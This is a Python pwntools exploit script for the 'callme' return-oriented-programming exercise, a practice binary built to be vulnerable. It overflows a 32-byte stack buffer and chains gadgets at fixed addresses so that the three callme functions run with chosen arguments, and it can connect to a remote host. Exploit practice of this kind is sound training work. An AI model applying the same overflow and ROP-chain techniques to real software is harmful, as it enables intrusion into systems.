#!/usr/bin/env python3
import os
from pwn import *
from pwn_ext import *

exe = ELF("./callme_patched")
libc = ELF("./libcallme.so")

context.binary = exe
# GDB Compatability stuff
if "alacritty" in os.environ["TERM"]:
    context.terminal = ["alacritty", "-e"]
elif "tmux" in os.environ["TERM"]:
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ["GNOME_TERMINAL_SCREEN"]:
    context.terminal = ["gnome-terminal", "--"]

# Who needs more than one process?
if args.REMOTE:
    #p = remote("addr", 1337)
    p = nc_remote("") # just put entire nc command or host:port here
elif args.CLEAN:
    p = process([exe.path])
else:
    gdbscript = '''
    set sysroot /
    c
    '''
    p = gdb.debug([exe.path], gdbscript=gdbscript)

### PUT ACTUAL PWN STUFF BELOW THIS LINE ###

def main():
    # good luck pwning :)
    callme_one = exe.symbols["callme_one"]
    callme_two = exe.symbols["callme_two"]
    callme_three = exe.symbols["callme_three"]


    # Linux calling convention: 1_param -> RDI, 2_param -> RSI, 3_param -> RDX
    pop_rdi = p64(0x00000000004009a3)
    pop_rdx = p64(0x000000000040093e)
    pop_rsi_r15 = p64(0x00000000004009a1)
    # One gadget to pop all the registers (mind the order though)
    pop_rdi_rsi_rdx = p64(0x000000000040093c)
    ret = p64(0x00000000004006be)
    function_arguments = [p64(0xdeadbeefdeadbeef), p64(0xcafebabecafebabe), p64(0xd00df00dd00df00d)]
    # Helper to not write it over and over
    pop_all_with_values = pop_rdi + function_arguments[0] + pop_rsi_r15 + function_arguments[1] + p64(0x0) + pop_rdx + function_arguments[2]
    pop_with_values_one_gadget = pop_rdi_rsi_rdx + function_arguments[0] + function_arguments[1] + function_arguments[2]
    p.recvuntil(b">")
    # Buffer is 32 We need to overwrite the RBP and get to the correct buffer. 32 is the size of the buffer, we need 8 more to overwrite correctly.
    # p.sendline(b"A"*40 + p64(callme_one) + pop_all_with_values 
    #            + p64(callme_two) + pop_all_with_values 
    #            + p64(callme_three) + pop_all_with_values)

    # Insert ret for stack alignment!
    p.sendline(b"A"*40 + ret + pop_with_values_one_gadget + p64(callme_one) + pop_with_values_one_gadget + p64(callme_two) + pop_with_values_one_gadget + p64(callme_three))

    p.interactive()

if __name__ == "__main__":
    main()
